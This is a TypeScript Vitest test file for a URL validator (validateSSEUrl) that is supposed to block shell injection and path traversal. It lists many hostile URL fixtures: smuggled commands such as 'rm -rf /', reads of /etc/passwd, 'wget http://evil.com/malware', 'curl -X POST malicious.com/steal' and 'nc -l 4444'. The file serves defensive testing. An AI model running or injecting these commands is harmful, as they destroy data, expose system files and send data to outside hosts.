/**
 * REQ-854: Shell Injection Regex Refinement Tests - TDD
 *
 * PE-Reviewer Finding: Tests should validate security without false positives
 * Current Behavior: Overly broad regex blocks legitimate URLs
 * Expected Behavior: Refined regex allows safe commands while blocking dangerous ones
 *
 * Tests should validate security without false positives
 * Tests should allow safe commands while blocking dangerous ones
 */

import { describe, test, expect } from "vitest";

// Import function under test
let validateSSEUrl: (url: string, returnBoolean?: boolean) => boolean | string;

try {
  const cliModule = await import("../../bin/cli.js");
  validateSSEUrl = cliModule.validateSSEUrl;
} catch (error) {
  // Function doesn't exist yet - this is expected for TDD
  validateSSEUrl = () => {
    throw new Error("validateSSEUrl function not implemented yet - REQ-854");
  };
}

describe("REQ-854 — Shell injection regex refinement", () => {
  describe("Safe URLs that should be allowed", () => {
    test("REQ-854 — allows URLs with safe query parameters", () => {
      const safeUrls = [
        "https://cloudflare-sse.example.com/api?limit=10",
        "https://cloudflare-sse.example.com/api?filter=active",
        "https://cloudflare-sse.example.com/api?sort=date&order=asc",
        "https://cloudflare-sse.example.com/api?token=abc123def456",
        "https://cloudflare-sse.example.com/api?id=user-123",
        "https://cloudflare-sse.example.com/api?timestamp=1234567890"
      ];

      for (const url of safeUrls) {
        expect(() => validateSSEUrl(url, false)).not.toThrow();
        expect(validateSSEUrl(url, true)).toBe(true);
      }
    });

    test("REQ-854 — allows URLs with safe special characters in paths", () => {
      const safePathUrls = [
        "https://cloudflare-sse.example.com/api/v1",
        "https://cloudflare-sse.example.com/api/users-list",
        "https://cloudflare-sse.example.com/api/stream_events",
        "https://cloudflare-sse.example.com/api/real-time-data",
        "https://cloudflare-sse.example.com/api/users/123",
        "https://cloudflare-sse.example.com/api/teams/dev-team",
        "https://cloudflare-sse.example.com/api/files/doc.pdf"
      ];

      for (const url of safePathUrls) {
        expect(() => validateSSEUrl(url, false)).not.toThrow();
        expect(validateSSEUrl(url, true)).toBe(true);
      }
    });

    test("REQ-854 — allows URLs with safe encoded characters", () => {
      const safeEncodedUrls = [
        "https://cloudflare-sse.example.com/api?name=John%20Doe",
        "https://cloudflare-sse.example.com/api?email=user%40example.com",
        "https://cloudflare-sse.example.com/api?filter=created%3A2024",
        "https://cloudflare-sse.example.com/api/spaces%20and%20more"
      ];

      for (const url of safeEncodedUrls) {
        expect(() => validateSSEUrl(url, false)).not.toThrow();
        expect(validateSSEUrl(url, true)).toBe(true);
      }
    });

    test("REQ-854 — allows URLs with fragments and complex query strings", () => {
      const complexSafeUrls = [
        "https://cloudflare-sse.example.com/api#section1",
        "https://cloudflare-sse.example.com/api?q=search+term",
        "https://cloudflare-sse.example.com/api?data={\"key\":\"value\"}",
        "https://cloudflare-sse.example.com/api?callback=handleResponse"
      ];

      for (const url of complexSafeUrls) {
        expect(() => validateSSEUrl(url, false)).not.toThrow();
        expect(validateSSEUrl(url, true)).toBe(true);
      }
    });
  });

  describe("Dangerous URLs that should be blocked", () => {
    test("REQ-854 — blocks URLs with command injection attempts", () => {
      const commandInjectionUrls = [
        "https://cloudflare-sse.example.com/api?cmd=`rm -rf /`",
        "https://cloudflare-sse.example.com/api?exec=$(cat /etc/passwd)",
        "https://cloudflare-sse.example.com/api;ls -la",
        "https://cloudflare-sse.example.com/api|cat /etc/hosts",
        "https://cloudflare-sse.example.com/api&&whoami",
        "https://cloudflare-sse.example.com/api||ping google.com"
      ];

      for (const url of commandInjectionUrls) {
        expect(validateSSEUrl(url, true)).toBe(false);
        expect(() => validateSSEUrl(url, false)).toThrow(/dangerous characters/);
      }
    });

    test("REQ-854 — blocks URLs with shell metacharacters", () => {
      const shellMetaUrls = [
        "https://cloudflare-sse.example.com/api?data='malicious'",
        "https://cloudflare-sse.example.com/api?data=\"evil\"",
        "https://cloudflare-sse.example.com/api/path\\injection",
        "https://cloudflare-sse.example.com/api?cmd=<script>",
        "https://cloudflare-sse.example.com/api?param=>output.txt",
        "https://cloudflare-sse.example.com/api?data=[malicious]",
        "https://cloudflare-sse.example.com/api?data={exec}",
        "https://cloudflare-sse.example.com/api?data=(command)"
      ];

      for (const url of shellMetaUrls) {
        expect(validateSSEUrl(url, true)).toBe(false);
        expect(() => validateSSEUrl(url, false)).toThrow(/dangerous characters/);
      }
    });

    test("REQ-854 — blocks URLs with path traversal attempts", () => {
      const pathTraversalUrls = [
        "https://cloudflare-sse.example.com/api/../../../etc/passwd",
        "https://cloudflare-sse.example.com/api/..\\windows\\system32",
        "https://cloudflare-sse.example.com/api?file=../config.json",
        "https://cloudflare-sse.example.com/api/%2e%2e/%2e%2e/admin",
        "https://cloudflare-sse.example.com/api?path=....//etc/hosts"
      ];

      for (const url of pathTraversalUrls) {
        expect(validateSSEUrl(url, true)).toBe(false);
        expect(() => validateSSEUrl(url, false)).toThrow(/path traversal/);
      }
    });

    test("REQ-854 — blocks URLs with encoded injection attempts", () => {
      const encodedInjectionUrls = [
        "https://cloudflare-sse.example.com/api?cmd=%60rm%20-rf%20/%60",
        "https://cloudflare-sse.example.com/api?exec=%24%28whoami%29",
        "https://cloudflare-sse.example.com/api%3Bls%20-la",
        "https://cloudflare-sse.example.com/api%7Ccat%20/etc/passwd"
      ];

      for (const url of encodedInjectionUrls) {
        expect(validateSSEUrl(url, true)).toBe(false);
        expect(() => validateSSEUrl(url, false)).toThrow(/dangerous characters|path traversal/);
      }
    });
  });

  describe("Edge cases and refined detection", () => {
    test("REQ-854 — distinguishes between safe and dangerous similar patterns", () => {
      // Safe patterns that might be confused with dangerous ones
      const safeEdgeCases = [
        "https://cloudflare-sse.example.com/api?version=1.0.0", // periods in version
        "https://cloudflare-sse.example.com/api/users@company.com", // @ symbol in email
        "https://cloudflare-sse.example.com/api?time=12:30:45", // colons in time
        "https://cloudflare-sse.example.com/api?ratio=1/2", // forward slash in ratio
        "https://cloudflare-sse.example.com/api?math=a+b+c", // plus signs in math
        "https://cloudflare-sse.example.com/api?size=100%", // percent in size
      ];

      for (const url of safeEdgeCases) {
        expect(() => validateSSEUrl(url, false)).not.toThrow();
        expect(validateSSEUrl(url, true)).toBe(true);
      }

      // Dangerous patterns that should still be blocked
      const dangerousEdgeCases = [
        "https://cloudflare-sse.example.com/api?cmd=cat /etc/passwd", // space separation is dangerous
        "https://cloudflare-sse.example.com/api?exec=/bin/sh", // path to shell
        "https://cloudflare-sse.example.com/api?data=`ls`", // backticks
        "https://cloudflare-sse.example.com/api;echo 'hack'", // semicolon command separator
      ];

      for (const url of dangerousEdgeCases) {
        expect(validateSSEUrl(url, true)).toBe(false);
        expect(() => validateSSEUrl(url, false)).toThrow();
      }
    });

    test("REQ-854 — handles mixed safe and dangerous elements", () => {
      // URLs with some safe elements but dangerous overall
      const mixedDangerousUrls = [
        "https://cloudflare-sse.example.com/api/users?name=John&cmd=`rm -rf /`",
        "https://cloudflare-sse.example.com/api/v1/data;cat /etc/passwd",
        "https://cloudflare-sse.example.com/api?filter=active|malicious_command"
      ];

      for (const url of mixedDangerousUrls) {
        expect(validateSSEUrl(url, true)).toBe(false);
        expect(() => validateSSEUrl(url, false)).toThrow();
      }
    });

    test("REQ-854 — properly validates complex legitimate API endpoints", () => {
      const complexLegitimateUrls = [
        "https://cloudflare-sse.example.com/api/v2/webhooks/events?include=metadata&sort=timestamp",
        "https://cloudflare-sse.example.com/api/stream/real-time?channels=updates,alerts&format=json",
        "https://cloudflare-sse.example.com/api/notifications?user_id=12345&limit=50&offset=100",
        "https://cloudflare-sse.example.com/api/analytics/reports?start_date=2024-01-01&end_date=2024-12-31"
      ];

      for (const url of complexLegitimateUrls) {
        expect(() => validateSSEUrl(url, false)).not.toThrow();
        expect(validateSSEUrl(url, true)).toBe(true);
      }
    });
  });

  describe("Regex refinement validation", () => {
    test("REQ-854 — refined regex reduces false positives", () => {
      // These should NOT trigger false positives (common in legitimate URLs)
      const legitimatePatterns = [
        "https://cloudflare-sse.example.com/api?callback=jsonp_callback_123",
        "https://cloudflare-sse.example.com/api/oauth/token?grant_type=authorization_code",
        "https://cloudflare-sse.example.com/api/search?q=test+query&type=users",
        "https://cloudflare-sse.example.com/api/files/document.pdf?download=true"
      ];

      for (const url of legitimatePatterns) {
        expect(() => validateSSEUrl(url, false)).not.toThrow();
        expect(validateSSEUrl(url, true)).toBe(true);
      }
    });

    test("REQ-854 — refined regex maintains security for true threats", () => {
      // These should STILL be blocked (genuine security threats)
      const genuineThreats = [
        "https://cloudflare-sse.example.com/api?exec=`/bin/bash -c 'curl malicious.com'`",
        "https://cloudflare-sse.example.com/api;wget http://evil.com/malware",
        "https://cloudflare-sse.example.com/api?data=$(python -c 'import os; os.system(\"rm -rf /\")')",
        "https://cloudflare-sse.example.com/api|nc -l 4444",
        "https://cloudflare-sse.example.com/api&&curl -X POST malicious.com/steal"
      ];

      for (const url of genuineThreats) {
        expect(validateSSEUrl(url, true)).toBe(false);
        expect(() => validateSSEUrl(url, false)).toThrow();
      }
    });

    test("REQ-854 — context-aware validation for different URL components", () => {
      // Test that the refined regex considers context of where dangerous characters appear

      // Safe in certain contexts
      expect(() => validateSSEUrl("https://cloudflare-sse.example.com/api#section-1", false)).not.toThrow();
      expect(() => validateSSEUrl("https://cloudflare-sse.example.com/api?data=value1+value2", false)).not.toThrow();

      // Dangerous in command contexts
      expect(validateSSEUrl("https://cloudflare-sse.example.com/api?cmd=value1+value2+`ls`", true)).toBe(false);
      expect(validateSSEUrl("https://cloudflare-sse.example.com/api;command_here", true)).toBe(false);
    });

    test("REQ-854 — balanced security and usability", () => {
      // Ensure the security improvements don't break common legitimate use cases
      const commonLegitimateUseCases = [
        "https://cloudflare-sse.example.com/api/events?stream=real-time-updates",
        "https://cloudflare-sse.example.com/api/webhooks?signature=abc123def456",
        "https://cloudflare-sse.example.com/api/channels?subscribe=user-notifications",
        "https://cloudflare-sse.example.com/api/streaming/data?format=json&compress=gzip"
      ];

      let legitimateUrlsBlocked = 0;
      for (const url of commonLegitimateUseCases) {
        try {
          validateSSEUrl(url, false);
        } catch (error) {
          legitimateUrlsBlocked++;
        }
      }

      // Should have very low false positive rate (ideally 0)
      expect(legitimateUrlsBlocked).toBeLessThanOrEqual(0);

      // But should still block obvious threats
      const obviousThreats = [
        "https://cloudflare-sse.example.com/api;rm -rf /",
        "https://cloudflare-sse.example.com/api|cat /etc/passwd",
        "https://cloudflare-sse.example.com/api?cmd=`evil_command`"
      ];

      let threatsAllowed = 0;
      for (const url of obviousThreats) {
        if (validateSSEUrl(url, true) === true) {
          threatsAllowed++;
        }
      }

      expect(threatsAllowed).toBe(0);
    });
  });
});